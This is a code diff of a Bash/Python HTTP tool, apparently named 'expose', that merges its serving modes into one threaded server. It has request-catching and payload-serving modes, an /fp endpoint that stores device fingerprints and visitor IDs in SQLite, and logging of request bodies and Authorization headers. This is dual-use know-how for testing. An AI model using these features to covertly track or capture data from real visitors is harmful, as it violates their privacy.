-if [ "${EXPOSE_ONCE:-0}" = "1" ]; then
-  _SPID=$(cat "${EXPOSE_SOCAT_PIDFILE:-}" 2>/dev/null || echo "")
-  if [ -n "$_SPID" ]; then
-    sleep 0.3
-    kill "$_SPID" 2>/dev/null
-  fi
-fi
-HANDLER
-  chmod +x "$h"
-  echo "$h"
-}
+_LOGO_SVG=$(_mktmp /tmp/expose-logo-svg.XXXXXX)
+cat > "$_LOGO_SVG" << 'LOGOSVG'
+<svg class="expose-mark" viewBox="0 0 64 52" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M7 15.5 23.5 6 40 15.5v19L23.5 44 7 34.5v-19Z"
+        stroke="currentColor" stroke-width="3.5" stroke-linejoin="round"/>
+  <path d="m16 19 14 8-14 8V19Z" fill="var(--acc, #10b981)"/>
+  <path d="m38 17 11-6M40 26h15M38 35l11 6"
+        stroke="var(--acc, #10b981)" stroke-width="3.5" stroke-linecap="round"/>
+  <circle cx="52" cy="9.5" r="3" fill="currentColor"/>
+  <circle cx="58" cy="26" r="3" fill="currentColor"/>
+  <circle cx="52" cy="42.5" r="3" fill="currentColor"/>
+</svg>
+LOGOSVG
 
 # ── Payload resolver ──────────────────────────────────────────────────────────
 resolve_payload() {
@@ -1483,12 +2303,12 @@ PAYLOAD_SRC
 
 # ── Common exports ────────────────────────────────────────────────────────────
 _export_common() {
-  export EXPOSE_VERBOSE="$VERBOSE" EXPOSE_COUNTER="$_COUNTERFILE"
-  export EXPOSE_UPLOAD_HTML="$_UPLOAD_HTML" EXPOSE_UPLOAD_PY="$_UPLOAD_PY" EXPOSE_UPLOAD_DIR="$UPLOAD_DIR"
+  export EXPOSE_PORT="$PORT" EXPOSE_BIND="$BIND" EXPOSE_VERBOSE="$VERBOSE"
+  export EXPOSE_UPLOAD_HTML="$_UPLOAD_HTML" EXPOSE_UPLOAD_DIR="$UPLOAD_DIR"
   export EXPOSE_AUTH="$AUTH" EXPOSE_CATCH="$CATCH" EXPOSE_RESP_CODE="${RESP_CODE:-200}"
   export EXPOSE_RESP_HEADERS="$_RESP_HDRS"
   export EXPOSE_LOGFILE="$_LOGFILE"
-  export EXPOSE_ONCE="$ONCE" EXPOSE_SOCAT_PIDFILE="$_socatpf"
+  export EXPOSE_ONCE="$ONCE"
   export EXPOSE_ALLOW="$_EXPOSE_ALLOW"
   export EXPOSE_BODY_LIMIT="$BODY_LIMIT"
   export EXPOSE_REDIRECT="$REDIRECT"
@@ -1497,83 +2317,81 @@ _export_common() {
   export EXPOSE_COLLECT="$COLLECT"
   export EXPOSE_COLLECT_FILE="$_COLLECT_FILE"
   export EXPOSE_CHAT_FILE="$_CHAT_FILE"
+  export EXPOSE_FP_JS="$_FP_JS"
+  export EXPOSE_ME_HTML="$_ME_HTML"
+  export EXPOSE_LOGO_SVG="$_LOGO_SVG"
+  export EXPOSE_DB="$_DB"
+  export EXPOSE_TLS="$TLS" EXPOSE_CERTFILE="${_CERTFILE:-}" EXPOSE_KEYFILE="${_KEYFILE:-}"
 }
 
-# ── Serve: text ───────────────────────────────────────────────────────────────
-serve_text() {
-  local cf
-  cf=$(_mktmp /tmp/expose-content.XXXXXX)
-  printf '%s' "$1" > "$cf"
-
-  local _socatpf
-  _socatpf=$(_mktmp /tmp/expose-socatpid.XXXXXX)
-
-  export EXPOSE_CONTENT="$cf" EXPOSE_LEN="${#1}" EXPOSE_MIME="text/plain; charset=utf-8"
+# ── Unified HTTP backend ──────────────────────────────────────────────────────
+serve_http() {
   _export_common
-
-  local _listen
-  if [[ $TLS -eq 1 ]]; then
-    _listen="OPENSSL-LISTEN:${PORT},bind=${BIND},reuseaddr,fork,cert=${_CERTFILE},key=${_KEYFILE},verify=0"
-  else
-    _listen="TCP-LISTEN:${PORT},bind=${BIND},reuseaddr,fork"
-  fi
-
-  socat "$_listen" SYSTEM:"$(make_handler)" &
-  local _spid=$!
-  echo "$_spid" > "$_socatpf"
-  wait "$_spid" || true
-}
-
-# ── Serve: file ──────────────────────────────────────────────────────────────
-serve_file() {
-  local fp mime sz
-  fp=$(realpath "$1")
-  mime=$(file -b --mime-type "$fp" 2>/dev/null || echo "application/octet-stream")
-  sz=$(stat -c'%s' "$fp" 2>/dev/null || wc -c < "$fp")
-
-  local _socatpf
-  _socatpf=$(_mktmp /tmp/expose-socatpid.XXXXXX)
-
-  export EXPOSE_CONTENT="$fp" EXPOSE_LEN="$sz" EXPOSE_MIME="$mime"
-  export EXPOSE_FILENAME="$(basename "$fp")"
-  _export_common
-
-  local _listen
-  if [[ $TLS -eq 1 ]]; then
-    _listen="OPENSSL-LISTEN:${PORT},bind=${BIND},reuseaddr,fork,cert=${_CERTFILE},key=${_KEYFILE},verify=0"
-  else
-    _listen="TCP-LISTEN:${PORT},bind=${BIND},reuseaddr,fork"
-  fi
-
-  socat "$_listen" SYSTEM:"$(make_handler)" &
-  local _spid=$!
-  echo "$_spid" > "$_socatpf"
-  wait "$_spid" || true
-}
-
-# ── Serve: directory ──────────────────────────────────────────────────────────
-serve_dir() {
-  export EXPOSE_PORT="$PORT" EXPOSE_VERBOSE="$VERBOSE"
-  export EXPOSE_UPLOAD_DIR="$UPLOAD_DIR" EXPOSE_UPLOAD_HTML="$_UPLOAD_HTML"
-  export EXPOSE_AUTH="$AUTH"
-  export EXPOSE_LOGFILE="$_LOGFILE"
-  export EXPOSE_BIND="$BIND"
-  export EXPOSE_ALLOW="$_EXPOSE_ALLOW"
-  export EXPOSE_CHAT_FILE="$_CHAT_FILE"
   python3 <<'PYEOF'
-import http.server, socketserver, sys, datetime, os, socket, re, json, time, ipaddress, threading, fcntl
+import base64
+import datetime
+import email.parser
+import email.policy
+import fcntl
+import html
+import hmac
+import http.server
+import ipaddress
+import json
+import mimetypes
+import os
+import re
+import signal
+import socket
+import socketserver
+import sqlite3
+import ssl
+import stat
+import sys
+import threading
+import time
+import urllib.parse
 
 port = int(os.environ["EXPOSE_PORT"])
 bind_addr = os.environ.get("EXPOSE_BIND", "0.0.0.0")
 verbose = os.environ.get("EXPOSE_VERBOSE", "0") == "1"
+mode = os.environ.get("EXPOSE_MODE", "text")
 upload_dir = os.environ.get("EXPOSE_UPLOAD_DIR", "/tmp/expose-uploads")
 upload_html_path = os.environ.get("EXPOSE_UPLOAD_HTML", "")
+me_html_path = os.environ.get("EXPOSE_ME_HTML", "")
+logo_svg_path = os.environ.get("EXPOSE_LOGO_SVG", "")
 auth_required = os.environ.get("EXPOSE_AUTH", "")
 log_file = os.environ.get("EXPOSE_LOGFILE", "")
 chat_file = os.environ.get("EXPOSE_CHAT_FILE", "")
 allow_nets = [n.strip() for n in os.environ.get("EXPOSE_ALLOW", "").split(",") if n.strip()]
+content_path = os.environ.get("EXPOSE_CONTENT", "")
+content_mime = os.environ.get("EXPOSE_MIME", "application/octet-stream")
+content_name = os.environ.get("EXPOSE_FILENAME", "")
+response_code = int(os.environ.get("EXPOSE_RESP_CODE", "200"))
+redirect_url = os.environ.get("EXPOSE_REDIRECT", "")
+delay_seconds = int(os.environ.get("EXPOSE_DELAY_MS", "0")) / 1000
+body_limit = int(os.environ.get("EXPOSE_BODY_LIMIT", "4096"))
+catch_requests = os.environ.get("EXPOSE_CATCH", "0") == "1"
+serve_once = os.environ.get("EXPOSE_ONCE", "0") == "1"
+collect_file = os.environ.get("EXPOSE_COLLECT_FILE", "")
+custom_headers = []
+for header in os.environ.get("EXPOSE_RESP_HEADERS", "").splitlines():
+    name, separator, value = header.partition(":")
+    if separator:
+        custom_headers.append((name.strip(), value.strip()))
+try:
+    with open(os.environ.get("EXPOSE_FP_JS", ""), "r") as _f:
+        fp_js = _f.read()
+except Exception:
+    fp_js = ""
+try:
+    with open(logo_svg_path) as logo_file:
+        logo_svg = logo_file.read()
+except OSError:
+    logo_svg = ""
 os.makedirs(upload_dir, exist_ok=True)
 req_counter = 0
+counter_lock = threading.Lock()
 _httpd = None
 
 def rdns(ip):
@@ -1601,34 +2419,29 @@ def parse_ua(ua):
     return browser, os_name
 
 def parse_multipart(body, content_type):
-    boundary = None
-    for p in content_type.split(";"):
-        p = p.strip()
-        if p.startswith("boundary="): boundary = p[9:].strip('"'); break
     saved = []
-    if not boundary: return saved
-    sep = ("--" + boundary).encode()
-    for part in body.split(sep)[1:]:
-        if part.strip() == b"--" or not part.strip(): continue
-        chunks = part.split(b"\r\n\r\n", 1)
-        if len(chunks) < 2: continue
-        hdrs, fdata = chunks
-        if fdata.endswith(b"\r\n"): fdata = fdata[:-2]
-        filename = None
-        for line in hdrs.decode("utf-8", errors="replace").split("\r\n"):
-            if "filename=" in line.lower():
-                for param in line.split(";"):
-                    param = param.strip()
-                    if param.lower().startswith("filename="):
-                        filename = param[9:].strip('"'); break
-        if not filename: continue
+    message = email.parser.BytesParser(policy=email.policy.default).parsebytes(
+        b"Content-Type: " + content_type.encode() + b"\r\nMIME-Version: 1.0\r\n\r\n" + body
+    )
+    if not message.is_multipart():
+        return saved
+    for part in message.walk():
+        if part.is_multipart():
+            continue
+        filename = part.get_filename()
+        if not filename:
+            continue
         name = os.path.basename(filename).replace("..", "").lstrip(".")
-        if not name: continue
+        if not name:
+            continue
         path = os.path.join(upload_dir, name)
         base, ext = os.path.splitext(name)
-        i = 1
-        while os.path.exists(path): path = os.path.join(upload_dir, f"{base}_{i}{ext}"); i += 1
-        with open(path, "wb") as f: f.write(fdata)
+        suffix = 1
+        while os.path.exists(path):
+            path = os.path.join(upload_dir, f"{base}_{suffix}{ext}")
+            suffix += 1
+        with open(path, "wb") as uploaded:
+            uploaded.write(part.get_payload(decode=True) or b"")
         saved.append(os.path.basename(path))
     return saved
 
@@ -1654,6 +2467,48 @@ def _write_log(entry):
             f.seek(0); f.truncate(); json.dump(log, f)
             fcntl.flock(f, fcntl.LOCK_UN)
     except: pass
+
+def _write_collect(entry):
+    if not collect_file:
+        return
+    try:
+        with open(collect_file, "a") as collected:
+            fcntl.flock(collected, fcntl.LOCK_EX)
+            collected.write(json.dumps(entry) + "\n")
+            fcntl.flock(collected, fcntl.LOCK_UN)
+    except OSError:
+        pass
+
+def _write_db(entry):
+    """Append the request to the persistent SQLite log (~/.expose/requests.db)."""
+    db = os.environ.get("EXPOSE_DB", "")
+    if not db: return
+    try:
+        con = sqlite3.connect(db, timeout=5)
+        con.execute("insert into requests(ts,time,method,path,ip,port,ua,host,content_type,content_len,mode) values(?,?,?,?,?,?,?,?,?,?,?)",
+                    (entry.get("ts"), entry.get("time"), entry.get("method"), entry.get("path"),
+                     entry.get("ip"), str(entry.get("port", "")), entry.get("ua"), entry.get("host", ""),
+                     entry.get("content_type", ""), entry.get("content_length", ""),
+                     os.environ.get("EXPOSE_MODE", "")))
+        con.commit(); con.close()
+    except Exception: pass
+
+def _write_fp(raw, ip, port, ua_hdr):
+    """Append a device fingerprint report to the SQLite fingerprints table."""
+    db = os.environ.get("EXPOSE_DB", "")
+    if not db or not raw: return
+    ua = vid = page = ""
+    try:
+        d = json.loads(raw)
+        ua = d.get("user_agent", ""); vid = d.get("visitor_id", ""); page = d.get("page", "")
+    except Exception: pass
+    try:
+        con = sqlite3.connect(db, timeout=5)
+        con.execute("insert into fingerprints(ts,time,ip,port,ua,page,visitor_id,data) values(?,?,?,?,?,?,?,?)",
+                    (time.time(), time.strftime('%H:%M:%S'), ip, port,
+                     ua or ua_hdr, page, vid, raw))
+        con.commit(); con.close()
+    except Exception: pass
 
 def _read_chat():
     """Thread-safe read of the chat JSON file."""
@@ -1683,13 +2538,51 @@ def _append_chat(msg):
     except: return False
 
 class Handler(http.server.SimpleHTTPRequestHandler):
+    protocol_version = "HTTP/1.1"
+
+    def end_headers(self):
+        self.send_header("Server", "expose")
+        for name, value in custom_headers:
+            self.send_header(name, value)
+        super().end_headers()
+
+    def finish(self):
+        try:
+            super().finish()
+        finally:
+            if serve_once and _httpd is not None:
+                threading.Thread(target=_httpd.shutdown, daemon=True).start()
+
+    def _send(self, status, body=b"", content_type="application/json", headers=()):
+        if isinstance(body, str):
+            body = body.encode()
+        self.send_response(status)
+        self.send_header("Content-Type", content_type)
+        self.send_header("Content-Length", str(len(body)))
+        for name, value in headers:
+            self.send_header(name, value)
+        self.end_headers()
+        if self.command != "HEAD":
+            self.wfile.write(body)
+
+    def _read_body(self):
+        try:
+            length = int(self.headers.get("Content-Length", "0"))
+        except ValueError:
+            length = 0
+        return self.rfile.read(length) if length > 0 else b""
+
+    def _check_access(self):
+        return not self._auth_fail() and not self._allow_fail()
+
     def _auth_fail(self):
         if not auth_required: return False
-        import base64
         ah = self.headers.get("Authorization", "")
         if ah.startswith("Basic "):
             try:
-                if base64.b64decode(ah[6:]).decode() == auth_required: return False
+                decoded = base64.b64decode(ah[6:]).decode()
+                if hmac.compare_digest(decoded, auth_required):
+                    return False
             except Exception: pass
         self.send_response(401)
         self.send_header("WWW-Authenticate", 'Basic realm="expose"')
@@ -1717,8 +2610,11 @@ class Handler(http.server.SimpleHTTPRequestHandler):
         return True
 
     def do_GET(self):
-        if self._auth_fail(): return
-        if self._allow_fail(): return
+        if not self._check_access():
+            return
+        if redirect_url:
+            self._send(302, b"", "text/plain", (("Location", redirect_url),))
+            return
         parsed = self.path.split('?', 1)
         ppath = parsed[0]
         if ppath == '/log':
@@ -1745,19 +2641,26 @@ class Handler(http.server.SimpleHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(body)
         elif self.path == '/meta':
-            result = json.dumps({"mode": "dir", "path": os.getcwd()}).encode()
+            metadata = {"mode": mode}
+            if mode == "dir":
+                metadata["path"] = os.getcwd()
+            elif mode == "file":
+                metadata.update(name=content_name, size=os.path.getsize(content_path),
+                                mime=content_mime)
+            elif mode in ("text", "payload"):
+                metadata["size"] = os.path.getsize(content_path)
+            result = json.dumps(metadata).encode()
             self.send_response(200)
             self.send_header("Content-Type", "application/json")
             self.send_header("Content-Length", str(len(result)))
             self.end_headers()
             self.wfile.write(result)
         elif self.path == '/ls' or self.path.startswith('/ls/'):
-            import urllib.parse, stat
             raw = urllib.parse.unquote(self.path[3:]) or '/'
             base = os.path.realpath(os.getcwd())
             rel = raw.lstrip('/')
             full = os.path.realpath(os.path.join(base, rel))
-            if not full.startswith(base):
+            if os.path.commonpath((base, full)) != base:
                 self.send_error(403); return
             if not os.path.isdir(full):
                 self.send_error(404); return
@@ -1789,7 +2692,6 @@ class Handler(http.server.SimpleHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(result)
         elif self.path.startswith("/upload/files/"):
-            import urllib.parse, mimetypes
             name = urllib.parse.unquote(self.path[len("/upload/files/"):])
             name = os.path.basename(name)
             fp = os.path.join(upload_dir, name)
@@ -1799,7 +2701,8 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                 self.send_response(200)
                 self.send_header("Content-Type", mime)
                 self.send_header("Content-Length", str(sz))
-                self.send_header("Content-Disposition", f'attachment; filename="{name}"')
+                encoded_name = urllib.parse.quote(name, safe="")
+                self.send_header("Content-Disposition", f"attachment; filename*=UTF-8''{encoded_name}")
                 self.end_headers()
                 with open(fp, "rb") as f:
                     while True:
@@ -1809,7 +2712,6 @@ class Handler(http.server.SimpleHTTPRequestHandler):
             else:
                 self.send_error(404)
         elif self.path == '/me':
-            import html as _html
             accept = self.headers.get("Accept", "")
             ip, port = self.client_address
             fields = [
@@ -1838,21 +2740,17 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                 self.wfile.write(result)
             else:
                 rows = "".join(
-                    f"<tr><td>{_html.escape(k)}</td><td>{_html.escape(v)}</td></tr>"
+                    f"<tr><td>{html.escape(k)}</td><td>{html.escape(v)}</td></tr>"
                     for k, v in fields if v and v != "-")
-                body = (
-                    "<html><head><meta charset='utf-8'><title>expose / me</title>"
-                    "<style>body{font:14px/1.6 ui-monospace,monospace;background:#1a1917;color:#c8c5be;"
-                    "max-width:700px;margin:2rem auto;padding:0 1rem}"
-                    "h1{font-size:1rem;color:#84817a;margin-bottom:1.5rem;font-weight:400}"
-                    "h1 b{color:#c8c5be}table{border-collapse:collapse;width:100%}"
-                    "td{padding:.35rem .6rem;border-bottom:1px solid #2a2820;font-size:.8125rem}"
-                    "td:first-child{color:#5c8abf;width:10rem;white-space:nowrap}"
-                    "td:last-child{color:#c8c5be;word-break:break-all}"
-                    "</style></head><body>"
-                    "<h1><b>expose</b> / me</h1>"
-                    f"<table>{rows}</table></body></html>"
-                ).encode()
+                try:
+                    with open(me_html_path) as template_file:
+                        template = template_file.read()
+                except OSError:
+                    template = "<html><body><table>{{ROWS}}</table><script>{{FPJS}}</script></body></html>"
+                body = (template.replace("{{ROWS}}", rows)
+                        .replace("{{FPJS}}", fp_js)
+                        .replace("{{LOGO}}", logo_svg)
+                        .encode())
                 self.send_response(200)
                 self.send_header("Content-Type", "text/html; charset=utf-8")
                 self.send_header("Content-Length", str(len(body)))
@@ -1865,8 +2763,27 @@ class Handler(http.server.SimpleHTTPRequestHandler):
             self.send_header("Content-Length", str(len(result)))
             self.end_headers()
             self.wfile.write(result)
-        else:
+        elif self.path == "/content" and mode != "dir":
+            if delay_seconds:
+                time.sleep(delay_seconds)
+            if not content_path or not os.path.isfile(content_path):
+                self.send_error(404)
+                return
+            size = os.path.getsize(content_path)
+            self.send_response(response_code)
+            self.send_header("Content-Type", content_mime)
+            self.send_header("Content-Length", str(size))
+            if content_name:
+                encoded_name = urllib.parse.quote(content_name, safe="")
+                self.send_header("Content-Disposition", f"inline; filename*=UTF-8''{encoded_name}")
+            self.end_headers()
+            with open(content_path, "rb") as content:
+                while chunk := content.read(65536):
+                    self.wfile.write(chunk)
+        elif mode == "dir":
             super().do_GET()
+        else:
+            self.send_error(404)
 
     def list_directory(self, path):
         base = os.path.realpath(os.getcwd())
@@ -1879,8 +2796,16 @@ class Handler(http.server.SimpleHTTPRequestHandler):
         return None
 
     def do_POST(self):
-        if self._auth_fail(): return
-        if self._allow_fail(): return
+        if not self._check_access():
+            return
+        body = self._read_body()
+        self.request_body = body[:body_limit] if body_limit else b""
+        if catch_requests and body:
+            shown = body[:body_limit] if body_limit else b""
+            sys.stderr.write(f"\n  body ({len(body)} bytes)\n")
+            sys.stderr.flush()
+            sys.stderr.buffer.write(shown + b"\n")
+            sys.stderr.buffer.flush()
         if self.path == '/log/clear':
             try:
                 with open(log_file, 'w') as f: json.dump([], f)
@@ -1892,9 +2817,7 @@ class Handler(http.server.SimpleHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(result)
         elif self.path == "/upload":
-            cl = int(self.headers.get("Content-Length", 0))
             ct = self.headers.get("Content-Type", "")
-            body = self.rfile.read(cl)
             saved = parse_multipart(body, ct)
             result = json.dumps({"saved": saved, "count": len(saved)}).encode()
             self.send_response(200)
@@ -1902,11 +2825,20 @@ class Handler(http.server.SimpleHTTPRequestHandler):
             self.send_header("Content-Length", str(len(result)))
             self.end_headers()
             self.wfile.write(result)
+        elif self.path == "/fp":
+            raw = body.decode('utf-8', errors='replace')
+            _write_fp(raw, self.client_address[0], str(self.client_address[1]),
+                      self.headers.get("User-Agent", ""))
+            result = json.dumps({"ok": True}).encode()
+            self.send_response(200)
+            self.send_header("Content-Type", "application/json")
+            self.send_header("Content-Length", str(len(result)))
+            self.end_headers()
+            self.wfile.write(result)
         elif self.path == '/chat':
-            cl = int(self.headers.get("Content-Length", 0))
-            if cl > 0:
-                body = self.rfile.read(cl).decode('utf-8', errors='replace').strip()
-                if _append_chat(body):
+            if body:
+                message = body.decode('utf-8', errors='replace').strip()
+                if _append_chat(message):
                     result = json.dumps({"ok": True}).encode()
                 else:
                     result = json.dumps({"ok": False, "error": "server"}).encode()
@@ -1918,7 +2850,11 @@ class Handler(http.server.SimpleHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(result)
         else:
-            self.send_error(405)
+            self._send(response_code, b"", "text/plain")
+
+    def do_OPTIONS(self):
+        if self._check_access():
+            self._send(204, b"", "text/plain")
 
     def do_DELETE(self):
         if self._auth_fail(): return
@@ -1944,7 +2880,9 @@ class Handler(http.server.SimpleHTTPRequestHandler):
 
     def log_message(self, fmt, *args):
         global req_counter
-        req_counter += 1
+        with counter_lock:
+            req_counter += 1
+            request_number = req_counter
         ua = self.headers.get("User-Agent", "-") if self.headers else "-"
         code = str(args[1]) if len(args) > 1 else "-"
         now = datetime.datetime.now().strftime("%H:%M:%S")
@@ -1959,7 +2897,7 @@ class Handler(http.server.SimpleHTTPRequestHandler):
             cc = "\033[32m" if code.startswith("2") else "\033[33m" if code.startswith("3") else "\033[31m"
             SEP = f"  {DM}│{W}"
             lines = []
-            lines.append(f"\n  {DM}┌─ #{req_counter} ─────────────────────────────────────────────{W}")
+            lines.append(f"\n  {DM}┌─ #{request_number} ─────────────────────────────────────────────{W}")
             lines.append(f"{SEP} {DM}{now}{W}  {BD}{self.command or '-'} {CY}{self.path or '-'}{W}  {cc}{code}{W}  {DM}{self.request_version}{W}")
             client_str = f"{client_ip}:{client_port}"
             if host_name: client_str += f"  {DM}({host_name}){W}"
@@ -2005,10 +2943,10 @@ class Handler(http.server.SimpleHTTPRequestHandler):
         sys.stderr.flush()
 
         # Write to JSON log
-        _skip = {'/log', '/log/clear', '/meta', '/upload/files'}
+        _skip = {'/log', '/log/clear', '/meta', '/upload/files', '/chat', '/fp'}
         _path_clean = (self.path or '').split('?')[0]
         if _path_clean not in _skip:
-            entry = {"n": req_counter, "ts": time.time(), "time": now,
+            entry = {"n": request_number, "ts": time.time(), "time": now,
                      "method": self.command or "-", "path": self.path or "-",
                      "httpver": self.request_version or "-",
                      "ip": client_ip, "port": client_port, "code": code, "ua": ua}
@@ -2019,34 +2957,38 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                            "Authorization", "DNT"):
                     v = self.headers.get(k)
                     if v: entry[k.lower().replace("-","_")] = v
+            request_body = getattr(self, "request_body", b"")
+            if request_body:
+                entry["body"] = request_body.decode("utf-8", errors="replace")
             _write_log(entry)
+            _write_collect(entry)
+            _write_db(entry)
 
-class Server(socketserver.TCPServer):
+class Server(socketserver.ThreadingTCPServer):
     allow_reuse_address = True
+    daemon_threads = True
 
 with Server((bind_addr, port), Handler) as httpd:
     _httpd = httpd
+
+    def stop_server(_signum, _frame):
+        threading.Thread(target=httpd.shutdown, daemon=True).start()
+
+    signal.signal(signal.SIGINT, stop_server)
+    signal.signal(signal.SIGTERM, stop_server)
+
+    if os.environ.get("EXPOSE_TLS") == "1":
+        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        context.load_cert_chain(os.environ["EXPOSE_CERTFILE"], os.environ["EXPOSE_KEYFILE"])
+        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
     httpd.serve_forever()
 PYEOF
-}
-
-# ── Serve: redirect ───────────────────────────────────────────────────────────
-serve_redirect() {
-  serve_text ""
-}
-
-# ── Serve: payload ────────────────────────────────────────────────────────────
-serve_payload() {
-  local content
-  content=$(resolve_payload "$PAYLOAD")
-  [[ -z "$content" ]] && die "Unknown payload: $PAYLOAD. Run expose --help for list."
-  serve_text "$content"
 }
 
 # ── Serve: websocket ──────────────────────────────────────────────────────────
 serve_websocket() {
   export EXPOSE_PORT="$PORT" EXPOSE_BIND="$BIND"
-  info "WebSocket echo server on ws://${BIND}:${PORT}"
+  log "WebSocket echo server on ws://${BIND}:${PORT}"
   python3 <<'PYEOF'
 #!/usr/bin/env python3
 """WebSocket echo server for expose --websocket"""
@@ -2175,7 +3117,7 @@ PYEOF
 do_replay() {
   local logfile="$1"
   [[ -f "$logfile" ]] || die "Log file not found: $logfile"
-  python3 <<'PYEOF'
+  python3 - "$logfile" <<'PYEOF'
 import sys, json, http.client, urllib.parse
 
 logfile = sys.argv[1]
@@ -2193,13 +3135,10 @@ method = entry.get('method', 'GET')
 path = entry.get('path', '/')
 host = entry.get('host', 'localhost')
 
-# Parse host:port from host header
-if ':' in host:
-    hostname, port = host.split(':', 1)
-    port = int(port)
-else:
-    hostname = host
-    port = 80
+# Parse host and optional port, including bracketed IPv6 addresses.
+destination = urllib.parse.urlsplit("//" + host)
+hostname = destination.hostname or "localhost"
+port = destination.port or 80
 
 print(f"Replaying {method} {path} -> {hostname}:{port}")
 
@@ -2220,21 +3159,39 @@ try:
     print(resp.read().decode('utf-8', 'replace')[:2000])
 except Exception as e:
     print(f"Error: {e}")
+    sys.exit(1)
 finally:
     conn.close()
 PYEOF
-  python3 - "$TARGET"
 }
 
 # ── Run ───────────────────────────────────────────────────────────────────────
 export EXPOSE_MODE="$MODE"
 case "$MODE" in
-  text)     serve_text "$TARGET" ;;
-  catch)    serve_text "" ;;
-  file)     serve_file "$TARGET" ;;
-  dir)      serve_dir ;;
-  redirect) serve_redirect ;;
-  payload)  serve_payload ;;
+  text|catch|redirect|dir)
+    if [[ "$MODE" == "text" ]]; then
+      _CONTENT_FILE=$(_mktmp /tmp/expose-content.XXXXXX)
+      printf '%s' "$TARGET" > "$_CONTENT_FILE"
+      export EXPOSE_CONTENT="$_CONTENT_FILE" EXPOSE_LEN="${#TARGET}" EXPOSE_MIME="text/plain; charset=utf-8"
+    fi
+    serve_http
+    ;;
+  file)
+    _CONTENT_FILE=$(realpath "$TARGET")
+    export EXPOSE_CONTENT="$_CONTENT_FILE"
+    export EXPOSE_LEN="$(stat -c'%s' "$_CONTENT_FILE" 2>/dev/null || wc -c < "$_CONTENT_FILE")"
+    export EXPOSE_MIME="$(file -b --mime-type "$_CONTENT_FILE" 2>/dev/null || echo "application/octet-stream")"
+    export EXPOSE_FILENAME="$(basename "$_CONTENT_FILE")"
+    serve_http
+    ;;
+  payload)
+    _PAYLOAD_CONTENT=$(resolve_payload "$PAYLOAD") \
+      || die "Unknown payload: $PAYLOAD. Run expose --help for list."
+    _CONTENT_FILE=$(_mktmp /tmp/expose-content.XXXXXX)
+    printf '%s' "$_PAYLOAD_CONTENT" > "$_CONTENT_FILE"
+    export EXPOSE_CONTENT="$_CONTENT_FILE" EXPOSE_LEN="${#_PAYLOAD_CONTENT}" EXPOSE_MIME="text/plain; charset=utf-8"
+    serve_http
+    ;;
   websocket) serve_websocket ;;
   replay)   do_replay "$TARGET" ;;
 esac
